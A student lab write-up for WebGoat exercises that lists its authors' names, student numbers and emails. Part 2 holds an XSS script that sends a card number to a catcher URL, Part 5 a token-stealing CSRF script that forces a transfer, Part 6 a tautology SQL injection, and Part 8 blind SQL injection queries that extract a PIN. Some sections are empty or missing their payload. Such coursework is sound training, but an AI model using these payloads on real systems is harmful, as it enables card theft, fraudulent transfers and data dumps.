#Hayden Goodfellow, 1004068386, Hayden.Goodfellow@mail.utoronto.ca
#Joseph Sawaya, 1004760537, joseph.sawaya@mail.utoronto.ca

Part 1 Explanation:
I enter the following html into the search box:
This takes advantage of the XSS vulnerability, the target website does not validate input by checking if it's html, for the search box and we are able to inject this code. 
To phish the user we create a dummy login form asking for their username and password.
When they enter their information and hit the submit button the myFunction script will run. 
This script gets the input from the form and then uses that to make a POST request to the url with the user's information as a query. 

Part 2 Explanation:
http://localhost:8090/WebGoat/start.mvc?#attack/1731484628/900?input1=bruh&input2=
<script> 
	document.form.buy.onclick = function () {
		var number = document.form.input1.value;
		var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard=" + number;
		document.getElementById("message").style.display = none;
		fetch(url, {method: "POST"});
	}; 
	document.form.input2.value = "000"
</script>

The field that is exploitable is the field with the name input2, that is asking for the 3 digits of the back of the user's credit card, that doesn't validate it's input.
The injected code sets a function that runs when the user clicks on the submit button to submit their credit card info, using the onclick property of the button. 
That function makes a post request to another url, including the credit card info in its query, getting that information from the field containing the credit card info. 

Part 3 Explanation:
This attack makes a post that includes code to load in an image, taking advatange of the vulnerable message field. When a user tries opening that post to view it, their browser will try to load that image.
The source field for that image is set to make a request to the same url with different query parameters such that the authenticated user that opens that message makes
a request to transfer funds. The website can't tell that this is an unwanted request and the user isn't alerted that it went through.

Part 4 Explanation:
This attack is similar to the previous one, where we insert code into the message field to inject code into the website. The code contains a script and two iframes.
The script sets the source of the second iframe, to a url that confirms the transfer, by setting the query parameter transfer to CONFIRMED. 
The way this works is that we set the source of the first iframe to a url to request the transfer.
Once the first iframe has finished loading then we set the source of the second iframe to a url such that it confirms the request.
When an authenticated user opens this message it will load the first iframe, starting the request, then set the source of the second iframe, confirming the request. 
Again the website can't tell that these are fake requests.

Part 5 Explanation:
The formatted attack I entered into the message field is:
<script>
	function read_one(){
		console.log("Reading one");
		var one = document.getElementById("one");
		var inbedded_doc = one.contentWindow.document;
		var form = inbedded_doc.getElementsByName("form")[0];
		// console.log("Type of form object: " + typeof(form));
		var token = form.token.value;
		console.log("Got token: " + token);
		add_token_to_two(token);
	}
	function add_token_to_two(token) {
		console.log("Adding token to two");
		var two = document.getElementById("two");
		two.src = "attack?Screen=1469770765&menu=900&transfer=5000" + "&token=" + token;
		console.log("Done adding token to two");
	}
</script>

<iframe id="one" src="attack?Screen=1469770765&menu=900&transfer=main" onload="read_one()" width="1" height="1"></iframe>

<iframe id="two" width="1" height="1"></iframe>

Part 6 Explanation:
In part 6 I entered this into the field to have it print all the credit card numbers: 
name' OR 'h' = 'h
Notice the missing closing '. This ' is provided by the query the server is already doing. Basically the server runs:
SELECT * FROM user_data WHERE last_name = 'name' OR 'h' = 'h'

This attack works since we have tricked the WHERE to be always true because 'h' = 'h' is always true 
and that is OR'd with the original comparison of last_name = 'name'.

Consequently, it will always print all of the data since the select statement is SELECT *.
The vulnerability we exploited was the server not using a prepared statement and instead performing the query 
directly with the user input. This vulnerability wouldn't have been an issue if they would have used a prepared statement.

Part 7 Explanation:

Part 8 Explanation:
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4000)
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4500)
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4900)
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4870)
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4863)
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) = 4862)
